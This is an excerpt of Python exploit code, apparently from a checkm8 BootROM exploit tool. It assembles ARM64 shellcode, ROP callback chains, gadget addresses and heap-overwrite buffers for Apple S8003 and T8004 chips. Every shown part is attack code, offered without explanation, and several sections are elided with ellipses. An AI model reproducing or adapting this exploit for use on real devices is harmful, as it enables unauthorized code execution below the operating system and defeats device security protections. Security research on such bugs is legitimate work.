...
def payload(cpid):
  ...
  if cpid == 0x8003:
    ...
    s8003_callbacks = [
      ...
      (s8003_dmb, 0),
      (s8003_enter_critical_section, 0),
      (s8003_write_ttbr0, 0x1800B0000),
      (s8003_tlbi, 0),
      (0x1820B0610, 0),
      (s8003_write_ttbr0, 0x1800A0000),
      (s8003_tlbi, 0),
      (s8003_exit_critical_section, 0),
      (0x1800B0000, 0),
    ]
    s8003_handler = asm_arm64_x7_trampoline(s8003_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s8003)[4:]
    s8003_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s8003)
    assert len(s8003_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(s8003_handler) <= PAYLOAD_SIZE_ARM64
    s8003_shellcode = s8003_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s8003_shellcode)) + s8003_handler
    assert len(s8003_shellcode) <= 0x400
    return struct.pack('<1024sQ504x2Q496s32x', s8003_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('s8003_shellcode_arm64')) + usb_rop_callbacks(0x1800B0800, s8003_func_gadget, s8003_callbacks)
  if cpid == 0x8004:
    constants_usb_t8004 = [
                0x48818000, # 1 - LOAD_ADDRESS
                0x65786563, # 2 - EXEC_MAGIC
...
def all_exploit_configs():
  ...
  s8003_overwrite    = '\0' * 0x580 + struct.pack('<32x2Q16x32x2QI',    s8003_nop_gadget, 0x1800B0800, s8003_nop_gadget, 0x1800B0800, 0xbeefbeef)
  ...
  return [
    ...
    DeviceConfig('iBoot-2234.0.0.2.22',   0x8003, None,    s8003_overwrite,    5,    1), # S8003 (buttons)
